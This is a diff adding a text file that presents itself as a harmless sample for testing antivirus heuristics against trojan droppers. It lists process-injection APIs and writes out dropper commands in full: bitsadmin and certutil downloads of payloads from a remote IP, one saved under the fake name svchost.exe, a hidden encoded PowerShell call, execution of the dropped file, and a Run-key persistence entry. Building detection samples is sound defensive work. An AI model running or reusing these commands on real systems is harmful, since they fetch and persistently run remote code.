@@ -1,0 +1,17 @@
+=== SIMULATED TROJAN DROPPER HEURISTIC TEST SAMPLE ===
+NOTICE: This is a harmless educational text file for testing antivirus and static malware analyzers.
+It does NOT contain executable or harmful code.
+
+[INJECTION HEURISTICS]
+API: VirtualAllocEx
+API: WriteProcessMemory
+API: CreateRemoteThread
+API: QueueUserAPC
+
+[REMOTE PAYLOAD RETRIEVAL]
+API: URLDownloadToFile
+Tool: bitsadmin /transfer trojanJob http://185.220.101.5/payload.bin C:\Users\Public\svchost.exe
+Tool: certutil -urlcache -split -f http://185.220.101.5/stage2.bin
+Execution: powershell.exe -nop -w hidden -enc JABzACAAPQAgAE4AZQB3AC0ATwBiAGo...
+Shell: cmd.exe /c start C:\Users\Public\svchost.exe
+Persistence: HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SecurityUpdate
